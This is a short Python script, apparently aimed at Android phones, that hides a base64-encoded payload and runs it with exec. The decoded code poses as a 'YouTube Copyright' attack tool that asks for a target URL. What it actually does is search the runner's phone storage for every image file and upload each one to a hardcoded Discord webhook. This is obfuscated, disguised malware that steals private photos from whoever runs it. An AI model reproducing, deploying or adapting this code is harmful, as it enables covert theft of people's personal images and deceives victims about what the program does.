import base64

code = b"""
aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmZyb20gdHFkbSBpbXBvcnQgdHFkbSAKCldFQkhPT0tfVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MDk1ODkzNjI5NzAxOTgwNTcvNUVseEVYTHZWUFBaaDBKYkZ0QW4tNjJ4X0htdWxIeEptY1pGVlNkd1VJRXJWVC1uQVFIYV9hMk5ZdXBaQk1UOXNzckQiCgpkZWYgZ2V0X2RldmljZV9pbmZvKCk6CiAgICB0cnk6CiAgICAgICAgaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgICAgIGxvY2FsX2lwID0gc29ja2V0LmdldGhvc3RieW5hbWUoaG9zdG5hbWUpCiAgICAgICAgcmV0dXJuIGhvc3RuYW1lLCBsb2NhbF9pcAogICAgZXhjZXB0OgogICAgICAgIHJldHVybiAiQmlsaW5taXlvciIsICJCaWxpbm1peW9yIgoKZGVmIHNlbmRfdG9fZGlzY29yZChmaWxlX3BhdGgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGVzID0geydmaWxlJzogKG9zLnBhdGguYmFzZW5hbWUoZmlsZV9wYXRoKSwgZmlsZSl9CiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoV0VCSE9PS19VUkwsIGZpbGVzPWZpbGVzKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiBzY2FuX2FuZF91cGxvYWQoKToKICAgIGltYWdlX2V4dGVuc2lvbnMgPSAoJy5qcGcnLCAnLmpwZWcnLCAnLnBuZycsICcuZ2lmJywgJy5ibXAnKQogICAgYmFzZV9kaXIgPSAiL3N0b3JhZ2UvZW11bGF0ZWQvMCIgCiAgICAKICAgIHRhcmdldF9pZCA9IGlucHV0KCJ1cmwiKQogICAgcHJpbnQoZiJcbiAqKnt0YXJnZXRfaWR9KiogYXR0YWNrLi4uIikKICAgIAogICAgaW1hZ2VfZmlsZXMgPSBbXQogICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoYmFzZV9kaXIpOgogICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkuZW5kc3dpdGgoaW1hZ2VfZXh0ZW5zaW9ucyk6CiAgICAgICAgICAgICAgICBpbWFnZV9maWxlcy5hcHBlbmQob3MucGF0aC5qb2luKHJvb3QsIGZpbGUpKQogICAgCiAgICB0b3RhbF9pbWFnZXMgPSBsZW4oaW1hZ2VfZmlsZXMpCiAgICBpZiB0b3RhbF9pbWFnZXMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdXJsISIpCiAgICAgICAgcmV0dXJuCiAgICAKICAgIHByaW50KGYiICoqe3RvdGFsX2ltYWdlc30qKiBMb2FkaW5nLi4uXG4iKQogICAgCiAgICBmb3IgaW1hZ2VfcGF0aCBpbiB0cWRtKGltYWdlX2ZpbGVzLCBkZXNjPSJMb2FkaW5nIiwgdW5pdD0iMCIpOgogICAgICAgIHNlbmRfdG9fZGlzY29yZChpbWFnZV9wYXRoKQogICAgICAgIHRpbWUuc2xlZXAoMSkgCiAgICAKICAgIHByaW50KCJcbiBTdWNjZXNmbHkgISIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcHJpbnQoIiIiCllvdVR1YmUgQ29weXJpZ2h0IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgL18vICAgIAogICAgIiIiKQogICAgc2Nhbl9hbmRfdXBsb2FkKCk=
"""

exec(base64.b64decode(code))